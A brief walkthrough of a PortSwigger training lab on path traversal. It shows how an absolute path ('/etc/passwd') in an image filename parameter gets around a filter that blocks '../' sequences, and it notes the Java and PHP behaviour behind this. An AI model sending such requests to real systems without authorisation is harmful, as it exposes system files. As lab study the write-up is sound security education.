# Lab 02 — Path traversal sequences blocked with absolute path bypass

> **Practitioner** · [Official lab](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

**Entry point:** `GET /image?filename=` · **Obstacle:** `../` sequences are
blocked.

## Solution

1. `../../../etc/passwd` → blocked.
2. If the application concatenates `base + filename` with filesystem
   semantics, a **fully-qualified path overrides the base** — no traversal
   needed:

```
GET /image?filename=/etc/passwd
```

Lab solved.

## Notes

This works on Java (`new File(base, filename)`) and PHP-variants where an
absolute path wins over the prefix.
